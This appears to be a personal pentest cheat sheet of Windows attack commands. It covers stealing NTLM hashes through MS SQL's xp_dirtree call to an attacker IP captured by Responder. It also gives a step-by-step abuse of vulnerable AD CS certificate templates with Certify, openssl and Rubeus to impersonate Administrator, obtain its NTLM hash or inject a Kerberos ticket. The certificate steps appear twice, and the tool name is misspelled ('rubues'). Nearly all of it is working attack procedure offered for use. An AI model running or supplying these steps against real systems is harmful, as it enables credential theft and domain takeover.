---
description: So just random notes and shell comands to do stuff
---

# Windows

## MS SQL

### Stealing NTLM hash&#x20;

need one of this permission

```
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_fileexist';
EXEC sp_helprotect 'xp_subdirs';
```

Then:

```
xp_dirtree '\\IP_ADDR\ANY`
```

After that responder should catch NTLM hash

## Vulnerable certificates

1. `.\Certify.exe find /vulnerable` - this finds any vulnerable template
2. `.\Certify.exe request /ca:<copy from output above> /template:<name of tempate> /altname:<user to impersonate>`
3. Copy PEM certificate and convert it with: `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
4. `.\rubues.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials`
5. Copy NTLM hash and PassTheHash
6. `.\rubues.exe asktgt /user:Administrator /certificate:cert.pfx /ptt` should inject kerberos ticket to current session but it wont always work



```
1. .\Certify.exe find /vulnerable - this finds any vulnerable tempalte
2. .\Certify.exe request /ca:<copy from output above> /template:<name of template> /altname:<user to impersonate>
3. Copy PEM certificate and convert it with openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
4. .\rubues.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
5. Copy NTLM hash and PassTheHash
5.5 .\rubues.exe asktgt /user:Administrator /certificate:cert.pfx /ptt should inject kerberos ticket to current session but it wont always work 
```
